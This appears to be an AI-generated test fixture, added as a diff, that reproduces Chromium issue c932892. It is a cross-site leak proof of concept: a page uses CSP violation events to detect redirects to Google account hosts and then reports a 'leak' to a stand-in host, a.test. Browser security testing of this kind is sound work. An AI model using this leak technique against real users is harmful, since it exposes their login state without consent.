@@ -1,0 +1,17 @@
+```json
+{
+    "c932892": {
+        "url_queue.txt": "https://a.test/CSP/c932892/main\nhttps://a.test/report/?leak=baseline\n",
+        "a.test": {
+            "main": {
+                "index.html": "<img src=\"https://bugs.chromium.org/issueattachment?id=805557\" />\n<script>\n    document.addEventListener(\"securitypolicyviolation\", function (e) {\n        console.log(\"Blocked URI: \" + e.blockedURI);\n        if (e.blockedURI.includes(\"accounts.google.com\") || e.blockedURI.includes(\"googleusercontent.com\")) {\n            document.location.href = \"https://a.test/report/?leak=c932892\";\n        }\n    });\n</script>",
+                "headers.json": "[\n    {\n        \"key\": \"Content-Security-Policy\",\n        \"value\": \"img-src 'self'; report-uri /report\"\n    }\n]"
+            }
+        }
+    }
+}
+```
+
+
+
+Prompt tokens: 20109Completion tokens: 222Total tokens: 20331
